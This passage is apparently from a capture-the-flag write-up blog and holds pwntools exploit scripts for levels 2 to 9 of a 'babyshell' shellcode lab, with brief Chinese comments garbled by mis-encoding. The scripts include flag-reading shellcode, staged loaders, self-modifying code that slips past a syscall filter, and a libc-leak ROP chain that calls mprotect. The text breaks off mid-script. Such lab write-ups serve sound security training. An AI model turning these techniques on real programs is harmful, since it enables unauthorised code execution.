class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level2&#x27;</span>)<br><br>se(asm(<span class="hljs-string">&#x27;nop;&#x27;</span>*<span class="hljs-number">0x700</span>+shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L3-v5"><a class="header-anchor" href="#L3-v5">Â¶</a>L3</h2><p>é™åˆ¶åŠ äº†å’Œæ²¡åŠ ä¸€æ · ovo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level3&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;info&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level3&#x27;</span>)<br><br>se(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L4-v5"><a class="header-anchor" href="#L4-v5">Â¶</a>L4</h2><p>ä¼ ç»Ÿæ‰‹è‰ºï¼Œè·³æ¿ shellcode å†æ¬¡è¾“å…¥ shellcodeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level4&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level4&#x27;</span>)<br><br>se(asm( <span class="hljs-string">&#x27;xor eax,eax;&#x27;</span>\<br>        <span class="hljs-string">&#x27;xor edi,edi;&#x27;</span>\<br>        <span class="hljs-string">&#x27;mov esi,0x25019000;&#x27;</span>\<br>        <span class="hljs-string">&#x27;xor dx,0x2333;&#x27;</span>\<br>        <span class="hljs-string">&#x27;syscall;&#x27;</span>))<br><br>se(asm(<span class="hljs-string">&#x27;nop;&#x27;</span>*<span class="hljs-number">0x100</span>+shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L5-v5"><a class="header-anchor" href="#L5-v5">Â¶</a>L5</h2><p>éƒ¨åˆ†åŒä¸Šï¼Œban äº† syscall å°±è¿è¡Œçš„æ—¶å€™ä¿®æ”¹æ‰è‡ªèº«çš„ shellcode æ„é€ å‡º syscall å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level5&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level5&#x27;</span>)<br>ru(<span class="hljs-string">&quot;[LEAK] Mapping shellcode memory at&quot;</span>)<br>shellcode_addr = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;!&#x27;</span>),<span class="hljs-number">16</span>))<br>se(asm( <span class="hljs-string">&#x27;xor eax,eax;&#x27;</span>+\<br>        <span class="hljs-string">&#x27;xor edi,edi;&#x27;</span>+\<br>        <span class="hljs-string">f&#x27;mov esi,<span class="hljs-subst">&#123;shellcode_addr&#125;</span>;&#x27;</span>+\<br>        <span class="hljs-string">&#x27;xor dx,0x2333;&#x27;</span>+\<br>        <span class="hljs-string">&#x27;add word ptr [rip],0x100;&#x27;</span>)+<span class="hljs-string">b&#x27;\x0f\x04&#x27;</span>)<br>pause()<br>se(asm(<span class="hljs-string">&#x27;nop;&#x27;</span>*<span class="hljs-number">0x100</span>+shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L6-v5"><a class="header-anchor" href="#L6-v5">Â¶</a>L6</h2><p>æ ˆ rwx æƒé™ï¼Œå¤åˆ¶ shellcode åˆ°æ ˆå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level6&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level6&#x27;</span>)<br>ru(<span class="hljs-string">&quot;[LEAK] Mapping shellcode memory at&quot;</span>)<br><br>shellcode_addr = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;!&#x27;</span>),<span class="hljs-number">16</span>))<br>se(asm( shellcraft.memcpy(<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-built_in">int</span>(shellcode_addr,<span class="hljs-number">16</span>)+<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>) + <span class="hljs-string">&#x27;jmp rsp;&#x27;</span>\<br>        <span class="hljs-string">&#x27;xor eax,eax;&#x27;</span>+\<br>        <span class="hljs-string">&#x27;xor edi,edi;&#x27;</span>+\<br>        <span class="hljs-string">&#x27;mov rsi,rsp;&#x27;</span>+\<br>        <span class="hljs-string">&#x27;xor dx,0x2333;&#x27;</span>+\<br>        <span class="hljs-string">&#x27;add word ptr [rip],0x100;&#x27;</span>)+<span class="hljs-string">b&#x27;\x0f\x04&#x27;</span>)<br>pause()<br>se(asm(<span class="hljs-string">&#x27;nop;&#x27;</span>*<span class="hljs-number">0x30</span>+shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L7-v3"><a class="header-anchor" href="#L7-v3">Â¶</a>L7</h2><p>å¯ä»¥è¾“å‡ºåˆ°æ–‡ä»¶ XDã€‚æˆ–è€…ç›´æ¥ chmod ğŸ‘ flag 777 ä¹Ÿå¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level7&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level7&#x27;</span>)<br>ru(<span class="hljs-string">&quot;[LEAK] Mapping shellcode memory at&quot;</span>)<br><br>shellcode_addr = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;!&#x27;</span>),<span class="hljs-number">16</span>))<br>se(asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)+shellcraft.pushstr(<span class="hljs-string">&#x27;fuck&#x27;</span>)+shellcraft.syscall(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">2</span>|<span class="hljs-number">64</span>,<span class="hljs-number">0</span>)+shellcraft.read(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L8-v3"><a class="header-anchor" href="#L8-v3">Â¶</a>L8</h2><p>ä¼ ç»Ÿæ‰‹è‰ºæ‰“æ ˆã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level8&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level8&#x27;</span>)<br><br>sea(<span class="hljs-string">&quot;Reading 0x12 bytes from stdin.&quot;</span>,asm(<span class="hljs-string">&#x27;inc eax;xor edi,edi;inc edi;mov rsi,rsp;&#x27;</span>+<span class="hljs-string">&#x27;syscall;xor eax,eax;dec edi;syscall;ret;&#x27;</span>))<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_leak = uu64(ru(p8(<span class="hljs-number">0x7f</span>),drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_leak = uu64(ru(p8(<span class="hljs-number">0x7f</span>),drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_leak = uu64(ru(p8(<span class="hljs-number">0x7f</span>),drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_leak = uu64(ru(p8(<span class="hljs-number">0x7f</span>),drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_leak = uu64(ru(p8(<span class="hljs-number">0x7f</span>),drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_leak = uu64(ru(p8(<span class="hljs-number">0x7f</span>),drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x774620</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>pop_rdi_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rdi\nret&quot;</span>)))<br>pop_rsi_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rsi\nret&quot;</span>)))<br>pop_rax_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rax\nret&quot;</span>)))<br>syscall_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>)))<br><span class="hljs-comment"># pop_rdx_ret = next(libc.search(asm(&quot;pop rdx\nret&quot;)))</span><br><span class="hljs-comment"># lg(&#x27;pop_rdx_ret&#x27;,pop_rdx_ret)</span><br>pop_rdx_r12_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rdx\npop r12\nret&quot;</span>)))<br>lg(<span class="hljs-string">&#x27;pop_rdx_r12_ret&#x27;</span>,pop_rdx_r12_ret)<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>rop_chain = flat([pop_rdi_ret,stack_addr&amp;(~<span class="hljs-number">0xfff</span>),pop_rsi_ret,<span class="hljs-number">0x2000</span>,pop_rdx_r12_ret,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,<br>                    stack_addr+<span class="hljs-number">0x1a</span>,asm(<span class="hljs-string">&#x27;nop;&#x27;</span>)*<span class="hljs-number">0x10</span>+asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)+shellcraft.exit(<span class="hljs-number">0</span>))])<br>se(rop_chain)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L9-v3"><a class="header-anchor" href="#L9-v3">Â¶</a>L9</h2><p>è·³ä¸€ä¸‹å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level9&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level9&#x27;</span>)<br><br>se(asm(<span class="hljs-string">&#x27;xor edi,edi;inc edi;mov rsi,rsp;&#x27;</span>)+<span class="hljs-string">b&#x27;\xeb\x0b\x00&#x27;</span>+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">10</span>+asm(<span class="hljs-string">&#x27;xor edi,edi;syscall;jmp rsi;&#x27;</span>))<br>pause()<br>se(asm(shellcraft.cat(<span 